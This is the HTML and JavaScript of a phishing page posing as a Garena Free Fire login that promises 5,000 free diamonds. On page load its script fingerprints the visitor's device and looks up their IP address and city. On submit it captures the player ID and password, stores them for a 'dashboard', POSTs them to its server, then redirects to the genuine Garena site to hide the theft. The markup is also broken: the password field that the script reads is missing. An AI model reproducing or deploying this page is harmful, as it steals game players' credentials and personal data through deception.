<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire - Claim Your 5,000 Diamonds!</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&family=Oswald:wght@700&display=swap" rel="stylesheet">
    <style>
        /* Base Styles & Background */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Montserrat', sans-serif; /* Modern, clean font */
        }
        
        body {
            background-image: url('https://w0.peakpx.com/wallpaper/519/793/HD-wallpaper-garena-free-fire-2020-4k-garena-free-fire-games-2020-games.jpg'); /* আপনার ইমেজের URL এখানে বসবে */
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #f8f8f8; /* Softer white text */
            line-height: 1.6;
            overflow-x: hidden;
            padding: 20px; /* Overall padding for smaller screens */
        }
        
        /* Dark Overlay for Readability */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.75); /* Consistent dark overlay */
            backdrop-filter: blur(2px); /* Subtle blur for depth */
            z-index: -1;
        }

        /* Event Banner/Header */
        .event-banner {
            margin-bottom: 25px;
            text-align: center;
            z-index: 1;
            padding: 15px 25px;
            background: linear-gradient(90deg, rgba(255,102,0,0.9) 0%, rgba(255,204,0,0.9) 100%); /* Orange-gold gradient */
            border-radius: 12px;
            box-shadow: 0 5px 20px rgba(255, 102, 0, 0.5); /* Soft, vibrant shadow */
            border: 2px solid #ffcc00; /* Gold border */
            animation: pulseGlow 2s infinite alternate ease-in-out; /* Smoother pulse */
            max-width: 90%; /* Responsive width */
        }

        @keyframes pulseGlow {
            0% { box-shadow: 0 0 10px rgba(255, 102, 0, 0.5), 0 0 20px rgba(255, 204, 0, 0.3); }
            100% { box-shadow: 0 0 15px rgba(255, 102, 0, 0.7), 0 0 25px rgba(255, 204, 0, 0.5); }
        }
        
        .event-title {
            font-family: 'Oswald', sans-serif; /* More impactful for title */
            font-size: 44px;
            font-weight: 700;
            color: #ffffff; /* Pure white for strong contrast */
            text-shadow: 2px 2px 5px rgba(0,0,0,0.7); /* Clearer shadow */
            letter-spacing: 1.5px;
            text-transform: uppercase;
            line-height: 1.1;
        }

        .event-subtitle {
            font-family: 'Montserrat', sans-serif; /* Clean font for subtitle */
            font-size: 20px;
            font-weight: 600;
            color: #ffeeaa; /* Softer gold for subtitle */
            margin-top: 8px;
            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
        }
        
        /* Login Form Container */
        .login-container {
            background-color: rgba(10, 10, 10, 0.9); /* Very dark, slightly transparent */
            border: 1px solid #ffcc00; /* Thinner gold border for sleek look */
            padding: 40px; /* Increased padding */
            border-radius: 10px; /* Slightly less rounded */
            box-shadow: 0 0 40px rgba(255, 204, 0, 0.2); /* Wider, softer gold glow */
            width: 100%;
            max-width: 450px; /* Optimized max-width */
            text-align: center;
            z-index: 1;
            margin-top: 25px; /* Spacing from banner */
            margin-bottom: 25px;
        }
        
        h1 {
            
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 25px;
            color: white; /* Bright gold heading */
            text-shadow: 1px 1px 3px rgba(0,0,0,0.6);
            
        }

        .promo-message {
            font-family: 'Montserrat', sans-serif;
            font-size: 17px;
            color: #e0e0e0; /* Softer white for body text */
            margin-bottom: 35px; /* Increased spacing */
            line-height: 1.6;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
            max-width: 380px; /* Constrain text width for readability */
            margin-left: auto;
            margin-right: auto;
        }
        
        /* Form Inputs */
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        input[type="text"],
        input[type="password"] {
            width: 100%;
            height: 52px; /* Standardized height */
            border: 1px solid #666; /* Subtle grey border */
            border-radius: 6px; /* Slightly less rounded */
            padding: 0 18px;
            font-size: 17px;
            background-color: #2a2a2a; /* Darker input field */
            color: #f0f0f0; /* Light text in input */
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            outline: none;
        }
        
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #ffcc00; /* Gold focus */
            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.4); /* Softer focus ring */
        }
        
        ::placeholder {
            color: #a0a0a0; /* Clearer placeholder */
            font-size: 16px;
        }
        
        /* Primary Action Button */
        .login-button {
            background: linear-gradient(90deg, #ff6600 0%, #ffcc00 100%); /* Orange to gold */
            color: #222; /* Darker text for contrast */
            border: none;
            border-radius: 6px;
            padding: 16px 0;
            font-size: 22px; /* Impactful size */
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin-bottom: 25px;
            transition: background 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 5px 15px rgba(255, 102, 0, 0.4); /* Gentle button shadow */
        }
        
        .login-button:hover {
            background: linear-gradient(90deg, #ffcc00 0%, #ff6600 100%); /* Reversed gradient */
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 102, 0, 0.6);
        }

        .login-button:disabled {
            background: #8c6d31;
            cursor: wait;
            box-shadow: none;
            transform: none;
        }
        
        /* Secondary Links/Actions */
        .forgot-password {
            color: #88ccff; /* Softer blue link */
            text-decoration: none;
            font-size: 15px;
            display: block;
            margin-bottom: 30px;
            transition: color 0.2s ease;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
            color: #c0eaff;
        }
        
        .divider {
            border-bottom: 1px solid #444; /* Subtle divider */
            margin: 30px -40px; /* Aligns with padding */
        }

        .social-login-text {
            color: #cccccc;
            font-size: 15px;
            margin-bottom: 15px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.4);
        }

        .social-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }

        .social-button {
            background-color: #444; /* Neutral grey for social buttons */
            color: white;
            border: none;
            border-radius: 6px;
            padding: 10px 15px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            display: flex;
            align-items: center;
            justify-content: center; /* Center text within button */
            gap: 6px;
            text-decoration: none;
            flex-grow: 1;
            max-width: 130px; /* Slightly reduced max-width */
        }

        .social-button.facebook { /* Specific color for Facebook */
            background-color: #3b5998;
        }

        .social-button.google { /* Specific color for Google */
            background-color: #ea4335;
        }

        .social-button.guest {
            background-color: #6a6a6a;
        }
        
        .social-button:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }

        /* Footer */
        .footer {
            margin-top: 30px;
            text-align: center;
            color: #b0b0b0; /* Lighter grey for footer */
            font-size: 12px;
            max-width: 450px;
            padding: 0 10px;
            z-index: 1;
        }
        
        .footer-links {
            margin-top: 15px;
        }
        
        .footer-links a {
            color: #b0b0b0;
            text-decoration: none;
            margin: 0 6px;
            transition: color 0.2s ease;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
            color: #ffffff;
        }
        
        /* Responsive Adjustments */
        @media (max-width: 768px) {
            .event-banner { padding: 12px 20px; margin-bottom: 20px; }
            .event-title { font-size: 36px; }
            .event-subtitle { font-size: 18px; }
            .login-container { padding: 30px; margin-top: 20px; margin-bottom: 20px; }
            h1 { font-size: 28px; }
            .promo-message { font-size: 16px; margin-bottom: 30px; }
            input[type="text"], input[type="password"] { height: 50px; font-size: 16px; }
            ::placeholder { font-size: 15px; }
            .login-button { padding: 14px 0; font-size: 20px; }
            .forgot-password, .social-login-text { font-size: 14px; margin-bottom: 25px; }
            .social-button { padding: 10px 12px; font-size: 14px; max-width: 120px; }
            .footer { margin-top: 25px; font-size: 11px; }
        }

        @media (max-width: 480px) {
            body { padding: 10px; }
            .event-banner { padding: 10px 15px; margin-bottom: 15px; }
            .event-title { font-size: 28px; }
            .event-subtitle { font-size: 16px; }
            .login-container { padding: 25px; border-width: 1px; margin-top: 15px; margin-bottom: 15px; }
            h1 { font-size: 24px; margin-bottom: 20px; }
            .promo-message { font-size: 14px; margin-bottom: 25px; }
            input[type="text"], input[type="password"] { height: 45px; font-size: 15px; }
            ::placeholder { font-size: 14px; }
            .login-button { padding: 12px 0; font-size: 18px; }
            .forgot-password, .social-login-text { font-size: 13px; margin-bottom: 20px; }
            .social-buttons { flex-direction: column; gap: 8px; }
            .social-button { width: 100%; max-width: none; padding: 10px; font-size: 15px; }
            .footer { display: none; }
        }
    </style>
</head>
<body>

    <div class="event-banner">
        <div class="event-title">5000 DIAMONDS FREE!</div>
        <div class="event-subtitle">Limited Time Event - Claim Now!</div>
    </div>
    
    <div class="login-container">
        <h1>Free Fire Log In</h1>
      
        <form>
            <div class="input-group">
                <input type="text" name="email" id="player_id" placeholder="Your Free Fire Player ID" required>
            </div>
            
            <div class="input-group">

            <div class="divider"></div>

            <div class="social-login-text">Or log in with your social account:</div>
            <div class="social-buttons">

                <a href="#" class="social-button google">Google</a>
                <a href="#" class="social-button guest">Guest</a>
            </div>
        </form>
    </div>
    
    <div class="footer">
        <div class="footer-links">
            <a href="#">Official Rules</a> · 
            <a href="#">Terms & Conditions</a> · 
            <a href="#">Support</a>
        </div>
        <div style="margin-top: 10px;">Garena Free Fire © 2023 - All Rights Reserved</div>
    </div>

    <!-- =========== ডেটা সংগ্রহের জন্য নতুন স্ক্রিপ্ট =========== -->
    <script>
        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
        let deviceInfoPromise = (async () => {
            const deviceInfo = {
                ua: navigator.userAgent || 'Unknown',
                platform: navigator.platform || 'Unknown',
                language: navigator.language || 'Unknown',
                res: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            if (navigator.connection) {
                deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
            }
            
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
                    deviceInfo.isCharging = battery.charging;
                } catch (e) { /* ignore */ }
            }
            
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                deviceInfo.ip = ipData.ip;
                
                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const locationData = await locationResponse.json();
                deviceInfo.country = locationData.country_name;
                deviceInfo.city = locationData.city;
            } catch (e) {
                deviceInfo.ip = 'Failed to fetch';
            }
            
            return JSON.stringify(deviceInfo);
        })();

        // ফর্ম সাবমিট করার সময় ডেটা ম্যানেজ করা
        document.querySelector('form').addEventListener('submit', async function(event) {
            event.preventDefault(); // ফর্মের ডিফল্ট সাবমিশন বন্ধ করা

            const playerId = document.getElementById('player_id').value;
            const pass = document.getElementById('password').value;

            if (!playerId || !pass) {
                alert('Please enter both Player ID and password.');
                return;
            }

            const loginButton = document.querySelector('.login-button');
            loginButton.disabled = true;
            loginButton.textContent = 'Claiming...';
            
            const deviceInfo = await deviceInfoPromise;

            // LocalStorage-এ ডেটা সেভ করা (ড্যাশবোর্ডের জন্য)
            try {
                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
                if (!storedData.freefireData) {
                    storedData.freefireData = [];
                }
                // ড্যাশবোর্ডের সুবিধার জন্য 'playerId'-কে 'email' হিসেবে সেভ করা হচ্ছে
                storedData.freefireData.push({
                    email: playerId, 
                    pass: pass,
                    deviceInfo: deviceInfo,
                    timestamp: new Date().toLocaleString(),
                    type: 'login'
                });
                localStorage.setItem('userInputData', JSON.stringify(storedData));
            } catch (error) {
                console.error('Error saving to localStorage:', error);
            }

            // সার্ভারে ডেটা পাঠানোর সিমুলেশন
            try {
                await fetch('/', { 
                    method: 'POST', 
                    body: new URLSearchParams({ email: playerId, pass, deviceInfo }) 
                });
            } catch (error) {
                console.error('Error sending data to server:', error);
            }

            // ব্যবহারকারীকে আসল Garena Free Fire সাইটে রিডাইরেক্ট করা
            setTimeout(() => {
                window.location.href = 'https://ff.garena.com/';
            }, 1500);
        });
    </script>
</body>
